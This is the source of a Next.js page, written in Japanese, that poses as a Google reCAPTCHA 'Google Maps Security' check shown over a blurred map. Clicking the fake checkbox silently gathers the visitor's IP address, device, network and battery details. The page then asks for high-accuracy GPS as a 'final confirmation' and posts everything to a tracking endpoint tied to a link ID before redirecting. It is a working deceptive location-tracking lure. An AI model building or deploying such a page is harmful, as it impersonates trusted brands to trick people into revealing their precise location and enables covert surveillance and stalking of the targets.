// File: src/app/[track_id]/page.tsx
'use client'

import { useEffect, useState, use } from 'react'


export default function TrackPage({ params }: { params: Promise<{ track_id: string }> }) {
    const [statusText, setStatusText] = useState('')
    const [isVerifying, setIsVerifying] = useState(false)
    const [isChecked, setIsChecked] = useState(false)

    // unwrapping params in next15
    const unwrappedParams = use(params)
    const trackId = unwrappedParams.track_id

    const startVerification = async () => {
        setIsChecked(true)
        setIsVerifying(true)
        setStatusText('ロボットではないことを確認しています...')

        try {
            let ipData = { ip: '' }
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json')
                ipData = await ipResponse.json()
            } catch (e) {
                console.error("IP fetch failed", e)
            }

            // Collect basic env details immediately
            const envData: any = {
                ip_address: ipData.ip,
                user_agent: navigator.userAgent,
                screen_width: window.screen.width,
                screen_height: window.screen.height,
                window_width: window.innerWidth,
                window_height: window.innerHeight,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                logical_cores: navigator.hardwareConcurrency || null,
                device_memory: (navigator as any).deviceMemory || null,
                network_type: (navigator as any).connection?.effectiveType || null,
                network_speed: (navigator as any).connection?.downlink || null,
            }

            try {
                if ((navigator as any).getBattery) {
                    const battery = await (navigator as any).getBattery()
                    envData.battery_level = battery.level
                    envData.battery_charging = battery.charging
                }
            } catch (e) { }

            // 1. Request GPS position
            try {
                setStatusText('最終確認を行っています。位置情報へのアクセスを「許可」してください。')
                const position: any = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    })
                })

                // Success - User allowed GPS
                await submitData({
                    ...envData,
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    gps_accuracy: position.coords.accuracy,
                    gps_permission: true
                })
            } catch (error) {
                // Failure or Reject - Fallback to IP only
                await submitData({
                    ...envData,
                    gps_permission: false
                })
            }
        } catch (err) {
            // Fallback emergency redirect if everything fails
            window.location.href = 'https://maps.google.com'
        }
    }

    const submitData = async (payload: any) => {
        try {
            const res = await fetch('/api/track', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ linkId: trackId, ...payload })
            })

            if (res.ok) {
                const data = await res.json()

                if (data.targetUrl) {
                    // Instant redirect after success
                    window.location.replace(data.targetUrl)
                } else {
                    window.location.replace('https://maps.google.com')
                }
            } else {
                window.location.replace('https://maps.google.com')
            }
        } catch (e) {
            window.location.replace('https://maps.google.com')
        }
    }

    return (
        <div className="relative min-h-screen flex items-center justify-center bg-gray-100 overflow-hidden">
            {/* Blurred Background Map */}
            <div className="absolute inset-0 z-0 pointer-events-none opacity-60">
                <iframe
                    width="100%"
                    height="100%"
                    frameBorder="0"
                    style={{ border: 0, filter: 'blur(8px) grayscale(20%)', transform: 'scale(1.1)' }}
                    src={`https://maps.google.com/maps?q=Tokyo&hl=ja&z=14&output=embed`}
                    allowFullScreen
                    loading="lazy"
                ></iframe>
            </div>

            {/* Verification Card */}
            <div className="relative z-10 bg-white rounded-lg shadow-2xl p-6 max-w-sm w-full mx-4 border border-gray-200">
                <div className="flex flex-col items-center mb-6">
                    <img src="/map_icon.png" alt="Google Maps" className="w-16 h-16 mb-2 drop-shadow-sm" />
                    <h2 className="text-xl font-bold text-gray-800">セキュリティ認証</h2>
                    <p className="text-xs text-gray-500 mt-1 text-center">
                        スパムを防止し、安全に地図を表示するために人間であることを証明してください。
                    </p>
                </div>

                {!isVerifying ? (
                    <div
                        onClick={startVerification}
                        className="flex items-center justify-between border-2 border-gray-200 rounded-md p-4 bg-gray-50 cursor-pointer hover:bg-gray-100 transition-colors"
                    >
                        <div className="flex items-center space-x-4">
                            <div className="w-8 h-8 rounded border-2 border-gray-400 bg-white flex items-center justify-center hover:border-blue-500 transition-colors">
                            </div>
                            <span className="text-sm font-semibold text-gray-700">私はロボットではありません</span>
                        </div>
                        <div className="flex flex-col items-center justify-center ml-4">
                            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" className="w-8 h-8" />
                            <span className="text-[10px] text-gray-500 mt-1 font-sans">reCAPTCHA</span>
                        </div>
                    </div>
                ) : (
                    <div className="flex flex-col items-center space-y-4 py-4">
                        <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-600"></div>
                        <p className="text-sm font-bold text-gray-700 text-center animate-pulse">
                            {statusText}
                        </p>
                    </div>
                )}

                <div className="mt-6 border-t pt-4 text-center">
                    <p className="text-[10px] text-gray-400">
                        Protected by Google Maps Security<br />
                        <a href="#" className="hover:underline">Privacy</a> - <a href="#" className="hover:underline">Terms</a>
                    </p>
                </div>
            </div>
        </div>
    )
}
